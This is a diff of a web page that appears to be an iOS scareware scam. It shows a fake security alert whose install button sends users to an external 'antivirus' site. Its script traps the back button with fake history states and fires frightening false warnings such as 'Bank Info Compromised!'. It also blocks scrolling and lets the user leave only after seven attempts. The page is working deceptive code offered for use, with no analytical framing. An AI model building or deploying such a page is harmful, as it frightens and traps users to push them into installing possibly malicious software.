@@ -37,7 +37,7 @@
 
     .alert-box {
       background: #fff;
-      border: none; /* ✅ Red border removed */
+      border: none; /* Red border removed */
       border-radius: 18px;
       padding: 25px;
       max-width: 400px;
@@ -82,6 +82,15 @@
     .btn-install {
       background: #007aff;
       color: #fff;
+      text-align: center;
+      line-height: 1.4;
+    }
+
+    .btn-subtext {
+      display: block;
+      text-align: center;
+      font-size: 16px;
+      margin-top: 2px;
     }
 
     .btn-install:active {
@@ -122,7 +131,7 @@
 
       <div class="btn-group">
         <button class="btn btn-install" onclick="window.location.href='https://antivirus-browser.netlify.app/'">
-          INSTALL VPN PROTECTION NOW
+          🔒 INSTALL VPN PROTECTION<br><span class="btn-subtext">NOW</span>
         </button>
         <button class="btn btn-cancel" id="cancelBtn">
           CANCEL (RISKY)
@@ -132,52 +141,51 @@
     </div>
   </div>
 
-   <script>
-‎    let attempts = 0;
-‎    const maxAttempts = 7;
-‎    const cancelBtn = document.getElementById('cancelBtn');
-‎    const exitAttemptsText = document.getElementById('exitAttempts');
-‎    const alertBox = document.getElementById('alertBox');
-‎
-‎    // Push 10 fake states to aggressively trap back
-‎    for (let i = 0; i < 10; i++) {
-‎      history.pushState({}, '', location.href);
-‎    }
-‎
-‎    // Trap back button
-‎    window.onpopstate = function () {
-‎      history.pushState({}, '', location.href);
-‎      handleExitAttempt();
-‎    };
-‎
-‎    function handleExitAttempt() {
-‎      attempts++;
-‎      if (attempts <= maxAttempts) {
-‎        const messages = [
-‎          "iOS Security Risk Detected!",
-‎          "Location Tracking Active!",
-‎          "Bank Info Compromised!",
-‎          "Immediate VPN Protection Needed!",
-‎          "Critical: iCloud Access Risk!",
-‎          "Final Warning: Stop Exit!",
-‎          "You're at maximum risk!"
-‎        ];
-‎        alert(`⚠️ ${messages[attempts - 1]}`);
-‎        exitAttemptsText.textContent = `Exit attempts: ${attempts} / ${maxAttempts}`;
-‎        alertBox.style.animation = "shake 0.4s";
-‎        setTimeout(() => alertBox.style.animation = "", 500);
-‎      } else {
-‎        window.location.href = "about:blank"; // Final exit allowed
-‎      }
-‎    }
-‎
-‎    cancelBtn.addEventListener('click', handleExitAttempt);
-‎
-‎    // Prevent scroll or swipe exit
-‎    document.addEventListener('touchmove', function (e) {
-‎      e.preventDefault();
-‎    }, { passive: false });
-‎  </script>
-‎</body>
-‎</html>
-‎
+  <script>
+    let attempts = 0;
+    const maxAttempts = 7;
+    const cancelBtn = document.getElementById('cancelBtn');
+    const exitAttemptsText = document.getElementById('exitAttempts');
+    const alertBox = document.getElementById('alertBox');
+
+    // Push 10 fake history states to trap iOS back button
+    for (let i = 0; i < 10; i++) {
+      history.pushState({}, '', location.href);
+    }
+
+    // Trap back navigation
+    window.onpopstate = function () {
+      history.pushState({}, '', location.href);
+      handleExitAttempt();
+    };
+
+    function handleExitAttempt() {
+      attempts++;
+      if (attempts <= maxAttempts) {
+        const messages = [
+          "iOS Security Risk Detected!",
+          "Location Tracking Active!",
+          "Bank Info Compromised!",
+          "Immediate VPN Protection Needed!",
+          "Critical: iCloud Access Risk!",
+          "Final Warning: Stop Exit!",
+          "You're at maximum risk!"
+        ];
+        alert(`⚠️ ${messages[attempts - 1]}`);
+        exitAttemptsText.textContent = `Exit attempts: ${attempts} / ${maxAttempts}`;
+        alertBox.style.animation = "shake 0.4s";
+        setTimeout(() => alertBox.style.animation = "", 500);
+      } else {
+        window.location.href = "about:blank"; // Allow final exit
+      }
+    }
+
+    cancelBtn.addEventListener('click', handleExitAttempt);
+
+    // Prevent scroll
+    document.addEventListener('touchmove', function (e) {
+      e.preventDefault();
+    }, { passive: false });
+  </script>
+</body>
+</html>
